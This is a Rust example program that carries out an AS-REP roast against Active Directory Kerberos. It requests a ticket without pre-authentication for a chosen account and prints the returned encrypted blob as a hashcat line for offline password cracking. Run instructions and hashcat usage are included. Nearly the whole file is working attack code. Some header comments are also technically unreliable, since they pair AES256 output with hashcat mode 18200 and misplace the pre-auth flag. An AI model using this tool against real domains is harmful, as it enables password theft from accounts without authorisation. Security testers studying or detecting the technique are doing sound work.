//! `asrep_roast.rs` — AS-REP roast against a no-preauth account, emitting a
//! hashcat `-m 18200` line.
//!
//! When a target account carries `DONT_REQUIRE_PREAUTH` (a legacy MSDS-User-Account-
//! Control-Computed bit still common in the wild), the KDC returns an AS-REP for a
//! bare AS-REQ. The AS-REP's `enc-part.cipher` is a hashcat-crackable blob because
//! the KDC encrypted it with the account's long-term key (which is `string-to-key`
//! of the password) — offline dictionary attack against that blob recovers the
//! password without ever hitting the DC for guesses.
//!
//! Run with:
//! ```text
//! KDC=<host[:port]> REALM=<REALM> USER=<no-preauth-account> \
//!   cargo run --example asrep_roast
//! ```
//!
//! Feed the emitted line to hashcat (`hashcat -m 18200 hash.txt wordlist.txt`).
//! Compared to `Rubeus asreproast` in .NET or the impacket Python variant, this
//! is one Rust binary, no runtime, ~90 lines, no FFI.

use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use kerbcore::client::{
    build_as_req, client_cname, unix_to_kerberos_time,
};
use kerbcore::messages::{KdcRep, KrbError};

const AES256: i32 = 18;

fn main() {
    let kdc = env("KDC");
    let realm = env("REALM").to_uppercase();
    let user = env("USER");

    // Ask the KDC for a TGT with NO pre-auth. If the account has
    // DONT_REQUIRE_PREAUTH, the KDC returns an AS-REP immediately — that's the
    // whole roast primitive.
    let req = build_as_req(
        &realm,
        &client_cname(&user),
        rand_nonce(),
        &far_future(),
        &[AES256],
        vec![],
    );
    let resp = kdc_exchange(&kdc, &req);

    if let Ok(rep) = KdcRep::decode(&resp) {
        // Success shape: AS-REP came back. The `cipher` blob is the roastable
        // material. Emit the hashcat 18200 format: `$krb5asrep$18$user@REALM:<hex>`.
        // (Etype 18 = AES256 in hashcat's mode-18200 shape; etype 23 = RC4 is
        // mode 18200 too but uses a slightly different hash-format prefix.)
        let cipher_hex = hex_encode(&rep.enc_part.cipher);
        println!("$krb5asrep$18${user}@{realm}:{cipher_hex}");
        return;
    }

    if let Ok(err) = KrbError::decode(&resp) {
        eprintln!(
            "[-] KDC replied KRB-ERROR code {} — account is NOT AS-REP-roastable \
             (usually means pre-auth IS required, i.e. DONT_REQUIRE_PREAUTH is not set).",
            err.error_code
        );
        std::process::exit(2);
    }

    eprintln!("[-] KDC replied with an unrecognised message");
    std::process::exit(3);
}

fn env(k: &str) -> String {
    std::env::var(k).unwrap_or_else(|_| panic!("set env var {k}"))
}

fn now_secs() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs()
}

fn far_future() -> String {
    unix_to_kerberos_time(now_secs().saturating_add(10 * 3600))
}

fn rand_nonce() -> u32 {
    (SystemTime::now().duration_since(UNIX_EPOCH).unwrap().subsec_nanos()) | 1
}

fn kdc_exchange(target: &str, request: &[u8]) -> Vec<u8> {
    let mut stream = TcpStream::connect(target).expect("connect KDC");
    stream.set_read_timeout(Some(Duration::from_secs(8))).unwrap();
    let mut framed = (request.len() as u32).to_be_bytes().to_vec();
    framed.extend_from_slice(request);
    stream.write_all(&framed).unwrap();
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf).unwrap();
    let len = u32::from_be_bytes(len_buf) as usize;
    let mut resp = vec![0u8; len];
    stream.read_exact(&mut resp).unwrap();
    resp
}

fn hex_encode(bytes: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut out = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        out.push(HEX[(b >> 4) as usize] as char);
        out.push(HEX[(b & 0x0F) as usize] as char);
    }
    out
}
